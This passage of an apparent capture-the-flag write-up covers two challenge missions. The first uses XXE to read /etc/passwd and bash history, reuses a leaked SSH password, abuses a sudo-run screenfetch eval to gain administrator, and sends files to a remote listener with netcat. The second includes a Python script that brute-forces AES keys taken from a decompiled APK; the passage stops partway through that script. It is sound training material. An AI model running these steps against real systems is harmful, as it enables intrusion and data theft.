+</ul>
+<h2 id="mission-4---pentesting">Mission 4 - Pentesting</h2>
+<p><strong>Statement</strong>:</p>
+<p>One of your intelligence teams has managed to identify an application that is part of the entity&rsquo;s attack chain. Your mission is to break into this server and retrieve the next attack plans.</p>
+<p><strong>Solving</strong>:</p>
+<p>This mission starts with the IP address of a web server controlled by the attacker. This application appears to be used by the group to sign documents with an identifier unique to the victims in order to identify them if a document is exchanged.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image35.png"
+        data-srcset="/assets/images/writeups/dgse/image35.png, /assets/images/writeups/dgse/image35.png 1.5x, /assets/images/writeups/dgse/image35.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image35.png"
+        title="document_tracker_nullvastation" /></p>
+<p>The first thing to do is to take a blank Word document and test the application&rsquo;s two functions.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image36.png"
+        data-srcset="/assets/images/writeups/dgse/image36.png, /assets/images/writeups/dgse/image36.png 1.5x, /assets/images/writeups/dgse/image36.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image36.png"
+        title="result_tracker" /></p>
+<p>The first function downloads and signs our Word document, while the second displays the identifier that has been assigned to our document.</p>
+<p>It&rsquo;s interesting to note that Word documents (docx) are roughly a ZIP of several XML (source) files. As a result, we can &ldquo;unzip&rdquo; the docx modified by the application to see exactly what has been modified.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image37.png"
+        data-srcset="/assets/images/writeups/dgse/image37.png, /assets/images/writeups/dgse/image37.png 1.5x, /assets/images/writeups/dgse/image37.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image37.png"
+        title="docx_structure" /></p>
+<p>You soon realise that the tool only adds a single <strong>&lt;VictimID&gt;</strong> field to the <strong>app.xml</strong> file. In fact, we suspect that the Web application is going to perform XML parsing of the document in order to extract the victim&rsquo;s value.</p>
+<p>When you think of vulnerability exploitation and XML parsing, the first vulnerability to come to mind is <strong>XXE (XML External Entites)</strong>, which abuses XML parsing to read files on the system.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image38.png"
+        data-srcset="/assets/images/writeups/dgse/image38.png, /assets/images/writeups/dgse/image38.png 1.5x, /assets/images/writeups/dgse/image38.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image38.png"
+        title="XXE_payload_in_the_doc" /></p>
+<p>We can then modify the <strong>app.xml</strong> file so that it contains a payload for displaying the contents of the <strong>/etc/passwd</strong> file, re-zip the document and send it to the application.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image39.png"
+        data-srcset="/assets/images/writeups/dgse/image39.png, /assets/images/writeups/dgse/image39.png 1.5x, /assets/images/writeups/dgse/image39.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image39.png"
+        title="zip_back" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image40.png"
+        data-srcset="/assets/images/writeups/dgse/image40.png, /assets/images/writeups/dgse/image40.png 1.5x, /assets/images/writeups/dgse/image40.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image40.png"
+        title="upload_and_result" /></p>
+<p>The payload is executed correctly and the contents of the file are displayed correctly. Thanks to the /etc/passwd file, we can see that there are 3 users on the system:</p>
+<ul>
+<li>/home/document-user/</li>
+<li>/home/executor/</li>
+<li>/home/administrator/</li>
+</ul>
+<p>From here, it is possible to try and obtain information from the users&rsquo; home, but we can only read the files of the document-user user, which must be the user launching the web application. We will then read the user&rsquo;s <strong>/home/document-user/.bash_history</strong> file, which will tell us the history of commands entered by the user.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image41.png"
+        data-srcset="/assets/images/writeups/dgse/image41.png, /assets/images/writeups/dgse/image41.png 1.5x, /assets/images/writeups/dgse/image41.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image41.png"
+        title="bash_history" /></p>
+<p>In the history, we spot a command that&rsquo;s very interesting and seems to be an SSH password:</p>
+<ul>
+<li><strong>echo &ldquo;cABdTXRyUj5qgAEl0Zc0a&rdquo; &raquo; /tmp/exec_ssh_password.tmp</strong></li>
+</ul>
+<p>After a port scan of the IP address, there is indeed port <strong>22222</strong> which allows an SSH connection. We can now test the different users, and the <strong>executor</strong> user works.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image42.png"
+        data-srcset="/assets/images/writeups/dgse/image42.png, /assets/images/writeups/dgse/image42.png 1.5x, /assets/images/writeups/dgse/image42.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image42.png"
+        title="ssh_login_with_executor" /></p>
+<p>There is still one <strong>administrator</strong> user to compromise. To do this, you can start by listing the permissions held by the <strong>executor</strong> user.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image43.png"
+        data-srcset="/assets/images/writeups/dgse/image43.png, /assets/images/writeups/dgse/image43.png 1.5x, /assets/images/writeups/dgse/image43.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image43.png"
+        title="rights_of_user" /></p>
+<p>We then see that the user can run the <strong>screenfetch</strong> binary with <strong>administrator</strong> permissions. This binary is the utility that displays the information on our system, just as it did during our SSH connection.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image44.png"
+        data-srcset="/assets/images/writeups/dgse/image44.png, /assets/images/writeups/dgse/image44.png 1.5x, /assets/images/writeups/dgse/image44.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image44.png"
+        title="screenfetch" /></p>
+<p>If you read the documentation for the <strong>screenfetch</strong> tool, you will see that the &ldquo;-o&rdquo; connection option is used to overwrite the value of a variable already present in the tool&rsquo;s script, as in the example where the contents of the &ldquo;<strong>distro</strong>&rdquo; variable are overwritten with the value &ldquo;<strong>kalilinux</strong>&rdquo;.</p>
+<p>A quick look at the screenfetch source code shows that, in the end, this variable overwriting is nothing more than a simple &ldquo;<strong>eval()</strong>&rdquo; of the argument supplied by the user:</p>
+<ul>
+<li><a href="https://github.com/KittyKatt/screenFetch/blob/master/screenfetch-dev#L531" target="_blank" rel="noopener noreffer ">https://github.com/KittyKatt/screenFetch/blob/master/screenfetch-dev#L531</a></li>
+</ul>
+<p>This makes it easy to obtain a shell with the <strong>administrator</strong> user.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image45.png"
+        data-srcset="/assets/images/writeups/dgse/image45.png, /assets/images/writeups/dgse/image45.png 1.5x, /assets/images/writeups/dgse/image45.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image45.png"
+        title="privilege_escalation_with_screenfetch" /></p>
+<p>Once we&rsquo;re <strong>administrator</strong>, we notice the presence of two files in the home directory: a .kdbx file, which is the extension for KeePass safes, and a photo of the KeePass logo.</p>
+<p>The aim is to retrieve these files locally. To do this, we will use netcat to send the files to a remote listener.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image46.png"
+        data-srcset="/assets/images/writeups/dgse/image46.png, /assets/images/writeups/dgse/image46.png 1.5x, /assets/images/writeups/dgse/image46.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image46.png"
+        title="file_transfering" /></p>
+<p>The vault is obviously locked and we don&rsquo;t have the password, but KeePass supports several means of authentication, including via a &ldquo;key file&rdquo;, where the file will then be a password to unlock it. By testing on the logo we retrieved earlier, we can access the vault.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image47.png"
+        data-srcset="/assets/images/writeups/dgse/image47.png, /assets/images/writeups/dgse/image47.png 1.5x, /assets/images/writeups/dgse/image47.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image47.png"
+        title="use_of_the_logo_as_a_keyfile" /></p>
+<p>The safe is then opened, and the entity&rsquo;s identifiers and plans are made available to us.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image48.png"
+        data-srcset="/assets/images/writeups/dgse/image48.png, /assets/images/writeups/dgse/image48.png 1.5x, /assets/images/writeups/dgse/image48.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image48.png"
+        title="unlocked_vault" /></p>
+<p>The challenge validation flag can be found in the &ldquo;password&rdquo; field of the operation plan:</p>
+<ul>
+<li><strong>RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}</strong></li>
+</ul>
+<h2 id="mission-5---apk-reverse-engineering-and-cryptography">Mission 5 - APK Reverse Engineering and Cryptography</h2>
+<p><strong>Statement</strong>:</p>
+<p>During an arrest at the home of one of the previously identified attackers, the team seized a Google tablet used for their communications.</p>
+<p>During its analysis, a chat application appeared to be encrypted, making it impossible to access and discover its contents.</p>
+<p><strong>Solving</strong>:</p>
+<p>In this new mission, the context is the recovery of an Android device, apparently of the Google brand, recovered during a search, and the extraction of an application with its content encrypted.</p>
+<p>By emulating the mobile application, we can see that some of the messages received on the old device are not readable, probably because they have been encrypted with a different key for this device.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image49.png"
+        data-srcset="/assets/images/writeups/dgse/image49.png, /assets/images/writeups/dgse/image49.png 1.5x, /assets/images/writeups/dgse/image49.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image49.png"
+        title="mobile_apk_app" /></p>
+<p>To determine whether these messages are loaded dynamically or statically from the application, we can analyse the network when the mobile application is opened to see if we get any interaction.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image50.png"
+        data-srcset="/assets/images/writeups/dgse/image50.png, /assets/images/writeups/dgse/image50.png 1.5x, /assets/images/writeups/dgse/image50.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image50.png"
+        title="wireshark_inspect" /></p>
+<p>An HTTP request is made, in which a &ldquo;<strong>device_id</strong>&rdquo; parameter is sent to the <strong>/messages</strong> endpoint, which responds with a JSON containing encrypted messages.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image51.png"
+        data-srcset="/assets/images/writeups/dgse/image51.png, /assets/images/writeups/dgse/image51.png 1.5x, /assets/images/writeups/dgse/image51.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image51.png"
+        title="json_endpoint_response" /></p>
+<p>It is then possible to match the messages displayed when the mobile application is launched. The <strong>timestamp</strong> and <strong>sender</strong> appear to be identical to those displayed in the application, which shows that the application receives the JSON data and decrypts it directly.</p>
+<p>Another point to note about this endpoint is that, regardless of the key sent, only the <strong>last 3 messages</strong> are encrypted differently, as if the ones before them had already been encrypted with an old value (as seen on the application interface, where <strong>3 messages</strong> are readable and <strong>6 encrypted with an old key</strong>).</p>
+<p>To better understand how these messages are decrypted, let&rsquo;s open the APK application in jadx, a tool for decompiling and reading Java code, to see how it is encrypted.</p>
+<p>We then find, for example, our URL from which the messages are retrieved.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image52.png"
+        data-srcset="/assets/images/writeups/dgse/image52.png, /assets/images/writeups/dgse/image52.png 1.5x, /assets/images/writeups/dgse/image52.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image52.png"
+        title="source_code_apk" /></p>
+<p>If we look at the source code of the home page where the messages are displayed, we first find a <strong>SALT</strong> and an <strong>IV</strong>, used for AES decryption in addition to a <strong>key</strong>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image53.png"
+        data-srcset="/assets/images/writeups/dgse/image53.png, /assets/images/writeups/dgse/image53.png 1.5x, /assets/images/writeups/dgse/image53.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image53.png"
+        title="source_code_apk_2" /></p>
+<p>Further down in the code, decryption operations are carried out using these two hard-coded secrets, and we see how this famous key is created. To sum up, a hash string in base64 is formed from a condensation of the model and make of the phone. This is the key used to encrypt our messages.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image54.png"
+        data-srcset="/assets/images/writeups/dgse/image54.png, /assets/images/writeups/dgse/image54.png 1.5x, /assets/images/writeups/dgse/image54.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image54.png"
+        title="source_code_apk_3" /></p>
+<p>From there, we understand the entire AES encryption algorithm used, and it then becomes possible to decrypt the old messages. To do this, we already have our &ldquo;Brand&rdquo;, which is &ldquo;Google&rdquo; as the mission statement indicates, and then for the &ldquo;Model&rdquo;, there are lists provided by Google that list all the &ldquo;Models&rdquo; available. This list can be downloaded in CSV format and extract only the Google-branded models.</p>
+<ul>
+<li><a href="https://storage.googleapis.com/play_public/supported_devices.html" target="_blank" rel="noopener noreffer ">https://storage.googleapis.com/play_public/supported_devices.html</a></li>
+</ul>
+<p>You can then write a resolution script that will attempt to decrypt the messages one by one, using a different phone model each time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">STATIC_SALT</span> <span class="o">=</span> <span class="s2">&#34;s3cr3t_s@lt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">STATIC_IV</span> <span class="o">=</span> <span class="s2">&#34;LJo+0sanl6E3cvCHCRwyIg==&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BRAND</span> <span class="o">=</span> <span class="s2">&#34;Google&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_wordlist</span><span class="p">(</span><span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span> <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error loading </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash_device_id</span><span class="p">(</span><span class="n">model</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">brand</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">device_info</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">model</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">brand</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Hashing device info: </span><span class="si">{</span><span class="n">device_info</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">device_info</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hashed</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">digest</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Hashed device ID: </span><span class="si">{</span><span class="n">hashed</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashed</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">derive_key</span><span class="p">(</span><span class="n">device_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">salt</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">input_string</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">device_id</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Deriving key from: </span><span class="si">{</span><span class="n">input_string</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Derived key (hex): </span><span class="si">{</span><span class="n">key</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fix_base64_padding</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Add padding to base64 string if needed&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pad_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pad_length</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">pad_length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">try_decrypt</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">STATIC_IV</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;IV (hex): </span><span class="si">{</span><span class="n">iv</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">cleaned_message</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">padded_message</span> <span class="o">=</span> <span class="n">fix_base64_padding</span><span class="p">(</span><span class="n">cleaned_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Cleaned message: </span><span class="si">{</span><span class="n">padded_message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypted_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">padded_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Base64 decode error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Trying direct decode...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">encrypted_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Encrypted bytes (hex): </span><span class="si">{</span><span class="n">encrypted_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted bytes (hex): </span><span class="si">{</span><span class="n">decrypted_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Try different encodings</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encodings</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;latin1&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">encoding</span> <span class="ow">in</span> <span class="n">encodings</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">unpadded</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">unpadded</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Successfully decoded with </span><span class="si">{</span><span class="n">encoding</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed with </span><span class="si">{</span><span class="n">encoding</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decryption error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bruteforce_message</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">models</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span> <span class="n">brands</span><span class="p">:</span> <span class="nb">list</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">successful_combinations</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">models</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">brands</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">model</span> <span class="ow">in</span> <span class="n">models</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">brand</span> <span class="ow">in</span> <span class="n">brands</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Progress: </span><span class="si">{</span><span class="n">current</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">total</span><span class="si">}</span><span class="s2"> - Trying </span><span class="si">{</span><span class="n">model</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">brand</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">device_id</span> <span class="o">=</span> <span class="n">hash_device_id</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">brand</span><span class="p">)</span>
